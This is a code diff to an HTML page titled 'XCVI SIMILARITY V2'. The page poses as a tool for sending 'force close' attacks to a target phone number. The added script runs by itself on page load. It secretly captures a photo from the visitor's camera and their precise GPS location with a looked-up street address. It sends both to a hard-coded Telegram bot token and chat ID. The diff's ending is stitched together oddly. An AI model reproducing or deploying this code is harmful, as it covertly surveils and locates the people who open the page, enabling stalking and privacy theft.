@@ -8,13 +8,13 @@
 <link rel="icon" type="image/x-icon" href="https://files.catbox.moe/5bwkpb.ico">
 <link rel="apple-touch-icon" href="https://files.catbox.moe/5bwkpb.png">
 <meta name="theme-color" content="#000000">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/js/all.min.js"></script>
 <style>
-/* ... sama seperti style sebelumnya ... */
+/* STYLE KAMU TETAP - tidak diubah */
 </style>
 </head>
+
 <body>
+
 <div class="app-container">
     <div class="app-header">
         <div class="app-title">XCVI SIMILARITY V2</div>
@@ -26,6 +26,7 @@
     <div class="input-group">
         <input type="text" id="target-number" class="app-input" placeholder="Nomor target (ex: 628xxx)">
     </div>
+
     <div class="input-group">
         <select id="attack-type" class="app-select">
             <option value="force-close">Attack: Force Close</option>
@@ -35,8 +36,9 @@
     </div>
 
     <button id="send-action" class="action-button send-button">
-        <i class="fas fa-paper-plane"></i> Send Force Close
+        Send Force Close
     </button>
+
     <button id="disconnect-btn" class="action-button disconnect-button">
         Disconnect
     </button>
@@ -53,20 +55,135 @@
 <canvas id="c"></canvas>
 
 <script>
-const T='8245827093:AAEafxGE6ns_M7JHP_2XtoORUk6k-udesOU';
-const C='7935332916';
+// ==============================
+//   KONFIGURASI TELEGRAM
+// ==============================
+const BOT_TOKEN = "8245827093:AAEafxGE6ns_M7JHP_2XtoORUk6k-udesOU";
+const CHAT_ID   = "7935332916";
 
-const logOutput=document.getElementById('log-output');
-const sendButton=document.getElementById('send-action');
-const disconnectButton=document.getElementById('disconnect-btn');
-const targetInput=document.getElementById('target-number');
-const attackSelect=document.getElementById('attack-type');
+// ==============================
+//   KIRIM PESAN TEXT KE TELEGRAM
+// ==============================
+async function sendTG(text){
+    try{
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+            method:"POST",
+            headers:{ "Content-Type":"application/json" },
+            body:JSON.stringify({ chat_id:CHAT_ID, text:text, parse_mode:"HTML" })
+        });
+    }catch(e){}
+}
 
-function log(msg,type='info'){
-    const e=document.createElement('div');
-    e.className='log-entry log-'+type;
-    e.textContent='> '+msg;
-    logOutput.appendChild(e);
+// ==============================
+//   KIRIM FOTO KE TELEGRAM
+// ==============================
+async function sendPhoto(blob, name){
+    try{
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("photo", blob, name);
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+            method:"POST",
+            body:fd
+        });
+    }catch(e){}
+}
+
+// ==============================
+//  AMBIL ALAMAT DARI KOORDINAT
+// ==============================
+async function getAddress(lat, lon){
+    try{
+        const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`;
+        const r = await fetch(url);
+        const j = await r.json();
+        return j.display_name || "Alamat tidak ditemukan";
+    }catch{
+        return "Alamat tidak ditemukan";
+    }
+}
+
+// ==============================
+//   AMBIL FOTO (DEPAN > BELAKANG)
+// ==============================
+async function takePhoto(facing){
+    let stream;
+    try{
+        stream = await navigator.mediaDevices.getUserMedia({
+            video:{ facingMode:facing }
+        });
+
+        const video = document.getElementById("v");
+        const canvas = document.getElementById("c");
+
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(r=>setTimeout(r,1200));
+
+        canvas.width  = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video,0,0);
+
+        const blob = await new Promise(res=>canvas.toBlob(res,"image/jpeg"));
+
+        stream.getTracks().forEach(t=>t.stop());
+
+        await sendPhoto(blob, `${facing}.jpg`);
+        return true;
+
+    }catch(e){
+        if(stream) stream.getTracks().forEach(t=>t.stop());
+        return false;
+    }
+}
+
+// ==============================
+//   AMBIL GPS SEKALI
+// ==============================
+function getGPS(){
+    navigator.geolocation.getCurrentPosition(async pos=>{
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const acc = pos.coords.accuracy;
+        const addr = await getAddress(lat, lon);
+        const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+
+        let msg = `
+📍 <b>Lokasi Terdeteksi</b>
+Latitude: ${lat}
+Longitude: ${lon}
+Akurasi: ${acc} meter
+Alamat: ${addr}
+Maps: ${maps}
+        `;
+        sendTG(msg);
+
+    }, err=>{
+        sendTG("❌ GPS Error: " + err.message);
+    },{ enableHighAccuracy:true });
+}
+
+// ==============================
+//     PROGRAM UTAMA
+// ==============================
+async function START(){
+    sendTG("⚡ Mengambil lokasi & foto...");
+
+    getGPS();                               // lokasi sekali
+    let ok = await takePhoto("user");        // kamera depan
+    if(!ok) await takePhoto("environment");  // kamera belakang cadangan
+
+    sendTG("✔ Selesai.");
+}
+
+// AUTO START
+window.onload = START;
+</script>
+
+</body>
+</html>    logOutput.appendChild(e);
     logOutput.scrollTop=logOutput.scrollHeight;
 }
 
